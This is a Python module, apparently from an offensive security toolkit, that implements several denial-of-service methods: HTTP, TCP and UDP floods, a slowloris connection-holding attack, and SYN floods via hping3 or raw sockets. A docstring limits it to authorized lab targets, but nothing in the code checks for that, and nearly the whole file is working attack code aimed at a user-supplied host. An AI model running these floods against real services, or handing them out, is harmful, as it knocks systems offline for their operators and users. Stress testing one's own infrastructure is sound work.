"""DDoS / load-stress strategies (authorized lab targets only)."""
from __future__ import annotations

import socket
import threading
import time
from typing import Any, Dict, List, Tuple

from tools.fallback import FallbackRunner
from tools.arsenal_http import http_get, format_url


def _ab(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    if not runner.tool_available("ab"):
        return False, "ab not installed", ""
    url = format_url(kw.get("url", ""))
    n = kw.get("requests", "2000")
    c = kw.get("concurrency", "50")
    res = runner.run_cmd(f"ab -n {n} -c {c} -k {url} 2>&1 | tail -25", timeout=180)
    out = res.get("stdout", "")
    if "Requests per second" in out or "Complete requests" in out:
        return True, "benchmark complete", out
    return False, "ab failed", out[-1500:]


def _http_py(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    url = format_url(kw.get("url", ""))
    if not url:
        return False, "no url", ""
    duration = float(kw.get("duration", "10"))
    threads = min(int(kw.get("threads", "20")), 100)
    counter = {"n": 0, "err": 0}
    lock = threading.Lock()
    stop = threading.Event()

    def worker():
        while not stop.is_set():
            r = http_get(url, timeout=3.0)
            with lock:
                counter["n"] += 1
                if r["status"] == 0:
                    counter["err"] += 1

    workers = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    t0 = time.time()
    for w in workers:
        w.start()
    time.sleep(duration)
    stop.set()
    for w in workers:
        w.join(timeout=2)
    elapsed = time.time() - t0
    rate = counter["n"] / elapsed if elapsed else 0
    detail = (f"Target: {url}\nThreads: {threads}\nDuration: {duration}s\n"
              f"Requests sent: {counter['n']}\nErrors: {counter['err']}\nRate: {rate:.0f} req/s")
    return True, f"{counter['n']} requests in {elapsed:.1f}s ({rate:.0f} req/s)", detail


def _tcp_py(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    host = kw.get("host", "")
    port = int(kw.get("port", "80"))
    duration = float(kw.get("duration", "10"))
    threads = min(int(kw.get("threads", "30")), 150)
    counter = {"n": 0, "err": 0}
    lock = threading.Lock()
    stop = threading.Event()

    def worker():
        while not stop.is_set():
            try:
                with socket.create_connection((host, port), timeout=3):
                    with lock:
                        counter["n"] += 1
            except Exception:
                with lock:
                    counter["err"] += 1

    workers = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    t0 = time.time()
    for w in workers:
        w.start()
    time.sleep(duration)
    stop.set()
    for w in workers:
        w.join(timeout=2)
    elapsed = time.time() - t0
    rate = counter["n"] / elapsed if elapsed else 0
    detail = (f"Target: {host}:{port}\nConnections: {counter['n']}\n"
              f"Errors: {counter['err']}\nRate: {rate:.0f}/s")
    return True, f"{counter['n']} connections ({rate:.0f}/s)", detail


def _udp_py(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    host = kw.get("host", "")
    port = int(kw.get("port", "53"))
    duration = float(kw.get("duration", "10"))
    threads = min(int(kw.get("threads", "20")), 100)
    counter = {"n": 0}
    lock = threading.Lock()
    stop = threading.Event()
    payload = (kw.get("payload") or "A" * 64).encode()

    def worker():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not stop.is_set():
            try:
                s.sendto(payload, (host, port))
                with lock:
                    counter["n"] += 1
            except Exception:
                pass

    workers = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    t0 = time.time()
    for w in workers:
        w.start()
    time.sleep(duration)
    stop.set()
    for w in workers:
        w.join(timeout=2)
    elapsed = time.time() - t0
    rate = counter["n"] / elapsed if elapsed else 0
    detail = f"Target: {host}:{port} UDP\nDatagrams: {counter['n']}\nRate: {rate:.0f}/s"
    return True, f"{counter['n']} datagrams ({rate:.0f}/s)", detail


def _slowloris_py(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    host = kw.get("host", "")
    port = int(kw.get("port", "80"))
    duration = float(kw.get("duration", "15"))
    threads = min(int(kw.get("threads", "50")), 200)
    stop = threading.Event()
    sockets = []
    lock = threading.Lock()

    def open_sock():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            s.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nUser-Agent: Mozilla/5.0\r\n")
            with lock:
                sockets.append(s)
        except Exception:
            pass

    def keepalive():
        while not stop.is_set():
            with lock:
                for s in list(sockets):
                    try:
                        s.sendall(b"X-a: b\r\n")
                    except Exception:
                        try:
                            sockets.remove(s)
                        except Exception:
                            pass
            time.sleep(10)

    t0 = time.time()
    workers = [threading.Thread(target=open_sock, daemon=True) for _ in range(threads)]
    for w in workers:
        w.start()
    for w in workers:
        w.join(timeout=8)
    ka = threading.Thread(target=keepalive, daemon=True)
    ka.start()
    time.sleep(duration)
    stop.set()
    with lock:
        held = len(sockets)
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass
    detail = f"Target: {host}:{port}\nSockets held open: {held}\nDuration: {duration}s"
    return True, f"held {held} slowloris sockets", detail


def _syn_hping3(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    if not runner.tool_available("hping3"):
        return False, "hping3 not installed (needs root for raw SYN)", ""
    host = kw.get("host", "")
    port = kw.get("port", "80")
    duration = kw.get("duration", "10")
    res = runner.run_cmd(f"timeout {duration} hping3 -S -p {port} --flood {host} 2>&1 | tail -8",
                         timeout=int(duration) + 15)
    out = res.get("stdout", "")
    if "sending" in out or "packets" in out or res.get("exit_code") in (0, 124):
        return True, "SYN flood sent", out or f"hping3 ran for {duration}s"
    return False, "hping3 failed", out


def _syn_py(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    host = kw.get("host", "")
    port = int(kw.get("port", "80"))
    duration = float(kw.get("duration", "10"))
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        return False, "raw sockets require root", "Run as root or use hping3"
    except Exception as e:
        return False, f"raw socket unavailable: {e}", ""
    stop = threading.Event()
    counter = {"n": 0}
    lock = threading.Lock()

    def worker():
        while not stop.is_set():
            try:
                s.sendto(b"\x45\x00\x00\x28" + b"\x00" * 20 + b"\x40\x06\x00\x00" + b"\x00" * 8, (host, port))
                with lock:
                    counter["n"] += 1
            except Exception:
                pass

    workers = [threading.Thread(target=worker, daemon=True) for _ in range(4)]
    t0 = time.time()
    for w in workers:
        w.start()
    time.sleep(duration)
    stop.set()
    for w in workers:
        w.join(timeout=2)
    s.close()
    detail = f"Target: {host}:{port}\nRaw packets: {counter['n']}\nDuration: {duration}s"
    return True, f"sent {counter['n']} raw packets", detail


def http_stress_chain() -> List[Tuple[str, Any]]:
    return [("ab", _ab), ("python-http-flood", _http_py)]


def tcp_stress_chain() -> List[Tuple[str, Any]]:
    return [("python-tcp-flood", _tcp_py)]


def udp_stress_chain() -> List[Tuple[str, Any]]:
    return [("python-udp-flood", _udp_py)]


def slowloris_chain() -> List[Tuple[str, Any]]:
    return [("python-slowloris", _slowloris_py)]


def syn_flood_chain() -> List[Tuple[str, Any]]:
    return [("hping3", _syn_hping3), ("python-raw", _syn_py)]
